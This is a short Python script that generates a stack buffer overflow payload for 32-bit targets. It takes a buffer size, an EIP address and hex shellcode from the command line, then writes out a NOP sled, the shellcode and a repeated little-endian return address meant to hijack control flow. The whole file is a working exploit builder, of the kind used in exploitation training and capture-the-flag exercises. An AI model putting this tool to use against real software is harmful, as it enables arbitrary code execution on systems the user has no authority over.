#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import argparse


def little_endian(addr, offset=0):
  """Convert memory address to little endian."""

  addr = int(addr, 16) # - offset # adjust for argv put on stack
  return addr.to_bytes(4, byteorder='little')


def shellcode2bytes(shellcode):
  """Convert shellcode string to bytes."""

  bytecode = b""
  for i in range(0, len(shellcode), 4):
    data = shellcode[i:i+4][2:]
    bytecode += int(data, 16).to_bytes(1, byteorder='big')
  return bytecode


def payload(buff_size, shellcode, eip):
  """Create payload for the buffer overflow."""

  # be careful, if the buffer is not dividable by 4, memory won't align correctly
  if shellcode:
    shellcode = shellcode2bytes(shellcode)
    nop_size = buff_size - (len(shellcode) + 20) # keep space on the current stack frame
    return b"\x90" * nop_size + shellcode + little_endian(eip, buff_size) * 10
  else:
    return b"\x90" * buff_size + little_endian(eip) * 10


def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('-e', '--eip', help='address we should put the eip onto', required=True)
  parser.add_argument('-b', '--buffsize', help='size of the buffer', type=int, required=True)
  parser.add_argument('-s', '--shellcode', help='shellcode bytes')
  args = parser.parse_args()

  sys.stdout.buffer.write(payload(args.buffsize, args.shellcode, args.eip))


if __name__ == "__main__":
  main()
